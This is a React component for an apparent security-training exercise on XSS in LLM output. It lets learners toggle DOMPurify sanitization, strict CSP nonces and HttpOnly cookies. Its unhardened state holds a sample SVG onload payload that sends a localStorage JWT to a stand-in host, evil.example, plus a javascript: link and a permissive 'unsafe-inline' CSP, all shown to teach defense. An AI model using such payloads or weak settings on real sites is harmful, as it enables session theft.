import React, { useState } from 'react';
import { Code2, ShieldCheck, TriangleAlert } from 'lucide-react';
import { toast } from 'sonner';
import { ActivityComponentProps } from '../FallbackRoleActivity';
import RoleActivityFrame from '../../views/components/RoleActivityFrame';

export const LlmOutputXssCspActivity: React.FC<ActivityComponentProps> = ({
  step,
  exercises,
  onComplete,
}) => {
  const currentExercise = exercises[step] || exercises[0];
  const [useDomPurify, setUseDomPurify] = useState(false);
  const [useStrictCspNonce, setUseStrictCspNonce] = useState(false);
  const [useHttpOnlyCookie, setUseHttpOnlyCookie] = useState(false);

  const sanitizedOutput = useDomPurify
    ? '<svg></svg><a rel="noopener noreferrer">Report</a>'
    : '<svg onload="fetch(\'//evil.example/token?t=\'+localStorage.jwt)"></svg><a href="javascript:alert(1)">Report</a>';

  const cspHeader = useStrictCspNonce
    ? "script-src 'nonce-8f9a2b' 'strict-dynamic'; object-src 'none'; base-uri 'none'"
    : "script-src 'self' 'unsafe-inline'";

  const isSecure = useDomPurify && useStrictCspNonce && useHttpOnlyCookie;

  const handleApplyHardening = () => {
    setUseDomPurify(true);
    setUseStrictCspNonce(true);
    setUseHttpOnlyCookie(true);
    toast.success('Enabled DOMPurify AST sanitization, strict CSP nonces, and HttpOnly session cookies.');
  };

  return (
    <RoleActivityFrame
      exercise={currentExercise}
      onComplete={onComplete}
      toolbar={
        <button
          type="button"
          onClick={handleApplyHardening}
          className="inline-flex min-h-10 items-center gap-2 rounded-lg bg-red-600 px-3.5 py-1.5 text-sm font-bold text-white transition-colors hover:bg-red-500 cursor-pointer"
        >
          <ShieldCheck className="h-3.5 w-3.5" />
          Harden Render Pipeline
        </button>
      }
    >
      <div className="space-y-4 rounded-xl border border-slate-200 bg-slate-50 p-4 dark:border-slate-800 dark:bg-slate-950">
        <div className="grid grid-cols-1 gap-4 lg:grid-cols-[minmax(0,1fr)_19rem]">
          <div className="space-y-3 rounded-lg border border-slate-200 bg-white p-4 dark:border-slate-800 dark:bg-slate-900">
            <div className="flex items-center justify-between border-b border-slate-200 pb-2 text-xs font-mono dark:border-slate-800">
              <span className="inline-flex items-center gap-1.5 font-bold text-slate-700 dark:text-slate-200">
                <Code2 className="h-4 w-4 text-red-600 dark:text-red-400" />
                Rendered DOM Sink Preview
              </span>
              <span className={useDomPurify ? 'text-emerald-600 dark:text-emerald-400 font-bold' : 'text-rose-600 dark:text-rose-400 font-bold'}>
                {useDomPurify ? 'DOMPurify AST Active' : 'Raw dangerouslySetInnerHTML'}
              </span>
            </div>

            <div className="rounded-lg border border-slate-200 bg-slate-50 p-3 font-mono text-xs break-all dark:border-slate-800 dark:bg-slate-950">
              {sanitizedOutput}
            </div>

            <div className="rounded-lg border border-slate-200 bg-slate-50 p-3 font-mono text-xs dark:border-slate-800 dark:bg-slate-950">
              <span className="block text-slate-500">Active Response Header:</span>
              <span className="mt-1 block font-bold text-slate-800 dark:text-slate-200">
                Content-Security-Policy: {cspHeader}
              </span>
            </div>
          </div>

          <div className="space-y-3 rounded-lg border border-slate-200 bg-white p-4 dark:border-slate-800 dark:bg-slate-900">
            <p className="text-xs font-bold uppercase tracking-wider text-slate-500 dark:text-slate-400">
              Browser Defense Layers
            </p>
            <label className="flex cursor-pointer items-start gap-2.5 text-sm">
              <input
                type="checkbox"
                checked={useDomPurify}
                onChange={(e) => setUseDomPurify(e.target.checked)}
                className="mt-1 h-4 w-4 accent-red-600"
              />
              <span>Sanitize HTML/SVG via DOMPurify & block `javascript:` URIs</span>
            </label>
            <label className="flex cursor-pointer items-start gap-2.5 text-sm">
              <input
                type="checkbox"
                checked={useStrictCspNonce}
                onChange={(e) => setUseStrictCspNonce(e.target.checked)}
                className="mt-1 h-4 w-4 accent-red-600"
              />
              <span>Replace `&apos;unsafe-inline&apos;` with cryptographic CSP nonces</span>
            </label>
            <label className="flex cursor-pointer items-start gap-2.5 text-sm">
              <input
                type="checkbox"
                checked={useHttpOnlyCookie}
                onChange={(e) => setUseHttpOnlyCookie(e.target.checked)}
                className="mt-1 h-4 w-4 accent-red-600"
              />
              <span>Store session JWT in `HttpOnly; Secure; SameSite=Strict` cookie</span>
            </label>

            <div
              role="status"
              className={`flex items-start gap-2 rounded-lg p-3 text-xs leading-5 ${
                isSecure
                  ? 'border border-emerald-500/30 bg-emerald-50 text-emerald-800 dark:bg-emerald-950/30 dark:text-emerald-200'
                  : 'border border-amber-500/30 bg-amber-50 text-amber-800 dark:bg-amber-950/30 dark:text-amber-200'
              }`}
            >
              <TriangleAlert className="mt-0.5 h-4 w-4 shrink-0" />
              <span>
                {isSecure
                  ? 'Zero XSS execution: dangerous event handlers stripped, inline scripts blocked by CSP nonce, and session cookies unreadable by JS.'
                  : 'Incomplete defense: enable AST sanitization, CSP nonces, and HttpOnly cookies to close all DOM XSS paths.'}
              </span>
            </div>
          </div>
        </div>
      </div>
    </RoleActivityFrame>
  );
};

export default LlmOutputXssCspActivity;
